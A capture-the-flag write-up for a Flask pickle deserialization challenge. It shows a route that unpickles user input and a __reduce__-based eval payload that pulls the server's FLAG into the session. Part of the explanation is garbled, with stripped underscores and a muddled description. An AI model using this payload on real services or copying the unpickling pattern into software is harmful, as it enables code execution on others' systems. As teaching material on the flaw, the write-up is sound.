# web-deserialize-python
This challenge involves basic pickle insecure deserialization

# Solve
vulnerable code that deserialize user controlled input:
```python
@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)
```

When visiting and try to create a session at /create_session, we see that this is the structure of the session:
```
{'name': 'johnpork', 'userid': 'kdl', 'password': 'myminorsecret'}
```

Let's craft a payload that when pickle try to deserialize, will get the global FLAG var and include it in 'password':
```python
class Exploit:
    def __reduce__(self):
        return (eval, ("{'name': 'alice', 'userid': '1001', 'password': __import__('__main__').FLAG}",))

p = pickle.dumps(Exploit())
print(base64.b64encode(p))
```
This script will output the pickle dump that will print the flag when input into /check_session

>Why we use a class and the \_\_reduce\_\_ method:
> - When pickle deserialize, it will execute the lower method of the class, so it wont execute __init__
> - We pickle an object of the Exploit class `Exploit()` not the class itself `Exploit` to make pickle execute our script
> - the FLAG variable in the target process lives in that process's top-level module namespace, which is the main module when the Flask app is run. Unpickling happens inside the target process, so to access that global you need to reference the target's main (not your local script). Using import('main').FLAG explicitly fetches the FLAG from the unpickler's global namespace.
